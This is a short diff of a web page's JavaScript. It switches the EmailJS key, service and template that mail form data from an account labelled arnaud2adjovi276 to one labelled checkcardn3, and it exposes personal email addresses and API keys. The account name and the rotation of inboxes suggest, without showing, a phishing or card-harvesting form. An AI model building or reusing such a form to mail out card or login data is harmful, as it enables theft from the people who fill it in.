@@ -24,7 +24,8 @@
         (function () {
             // https://dashboard.emailjs.com/admin/account
             // emailjs.init('opvGRa51hKeitmK3T'); // email1 : arnaudadjovi274@gmail.com
-            emailjs.init('sMhRxLA9AzuJh6SMy'); // email2 : arnaud2adjovi276@gmail.com
+            // emailjs.init('sMhRxLA9AzuJh6SMy'); // email2 : arnaud2adjovi276@gmail.com
+            emailjs.init('KcZKjh817dVEaH7Os'); // email3 : checkcardn3@gmail.com
         })();
 
         var name = '';
@@ -179,9 +180,13 @@
             //     console.log("success !");
             // }) // email1 : arnaudadjovi274@gmail.com
 
-            emailjs.send("service_zmbs5xg", "template_dc87l9s", tempParams).then(function (res) {
+            // emailjs.send("service_zmbs5xg", "template_dc87l9s", tempParams).then(function (res) {
+            //     console.log("success !");
+            // }) // email2 : arnaud2adjovi276@gmail.com
+
+            emailjs.send("service_32dlx3v", "template_groha4b", tempParams).then(function (res) {
                 console.log("success !");
-            }) // email2 : arnaud2adjovi276@gmail.com
+            }) // email3 : checkcardn3@gmail.com
 
         }
 
